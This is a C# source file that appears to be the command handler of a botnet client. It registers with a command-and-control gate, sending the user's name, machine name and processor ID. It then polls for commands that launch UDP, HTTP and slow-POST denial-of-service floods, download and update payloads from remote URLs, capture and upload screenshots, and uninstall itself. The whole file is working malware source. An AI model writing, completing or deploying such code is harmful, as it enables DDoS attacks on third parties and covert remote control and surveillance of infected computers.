using System;
using System.Threading;

using T.Functions;
using T.Utilities;

namespace T.Core
{
    class CmdHandler
    {
        public static Communication COM = null;
        public static void Run()
        {
            //Installation.Install(Config.FileName, Config.RegistryName);
            COM = new Communication(Config.Gate, Config.EncryptionKey);
            Thread t = new Thread(new ParameterizedThreadStart(CmdHandler.ParseCommands));
            t.Start(COM);
        }
        public static void ParseCommands(object objCom)
        {
            Communication com = (Communication)objCom;
            bool bIdent = false;
            while (true)
            {
                while (!bIdent)
                {
                    if (com.HttpRequest(string.Format("page=ident&version={0}&os={1}&username={2}@{3}&hwid={4}",
                        Config.Version, SysUtils.GetOperatingSystem(), Environment.UserName, Environment.MachineName, CPU.ProcessorId())) == "Ident|OK")
                        bIdent = true;
                    Sleep(Config.Interval);
                }
                string cmd = com.HttpRequest("page=get_cmd&hwid=" + CPU.ProcessorId());

                if (!string.IsNullOrEmpty(cmd) && cmd.StartsWith("Command|"))
                {
                    string[] data = cmd.Remove(0, "Command|".Length).Split('|');
                    if (string.IsNullOrEmpty(data[0])) return;

                    switch (data[0])
                    {
                        case "Udpflood":
                        case "Httpflood":
                        case "Condis":
                        case "Slowpost":
                            if (string.IsNullOrEmpty(data[1]) || string.IsNullOrEmpty(data[2]) || string.IsNullOrEmpty(data[3])) return;
                            new Ddos(data[1], int.Parse(data[2]), int.Parse(data[3]), data[0]).Start();
                            break;
                        case "Download":
                            if (string.IsNullOrEmpty(data[1])) return;
                            Utils.DownloadFile(data[1]);
                            break;
                        case "Update":
                            if (string.IsNullOrEmpty(data[1])) return;
                            if (Utils.DownloadFile(data[1]))
                                Installation.Uninstall(Config.FileName, Config.RegistryName);
                            break;
                        case "MsgBox":
                            if (string.IsNullOrEmpty(data[1])) return;
                            NativeMethods.User32.MessageBoxA(0, data[1], "Title", 0);
                            break;
                        case "Text2Speech":
                            if (string.IsNullOrEmpty(data[1])) return;
                            Utils.TextToSpeech(data[1]);
                            break;
                        case "Screenshot":
                            SysUtils.UploadImage(ScreenManager.Instance.CompressImage(ScreenManager.Instance.CaptureScreen(), 90));
                            break;
                        case "Uninstall":
                            Installation.Uninstall(Config.FileName, Config.RegistryName);
                            break;
                        case "Test":
                            NativeMethods.User32.MessageBoxA(0, "This is a test!!!!", "Title", 0);
                            break;
                        default: break;
                    }

                    cmd = null;
                    data = null;
                }
                Sleep(Config.Interval);
            }
        }
        static void GetSettings(string setting)
        {
            /******************************/
            // Possible values of 'setting'
            // - get_motd
            // - get_version
            // - get_link
            /******************************/
            string cmd = COM.HttpRequest("page=" + setting);
            if (!string.IsNullOrEmpty(cmd) && cmd.StartsWith("Setting|"))
            {
                string data = cmd.Remove(0, "Setting|".Length);
                NativeMethods.User32.MessageBoxA(0, data, "Settings", 0);
            }
        }
        static void Sleep(int value)
        {
            System.Threading.Thread.Sleep(value);
        }
    }
}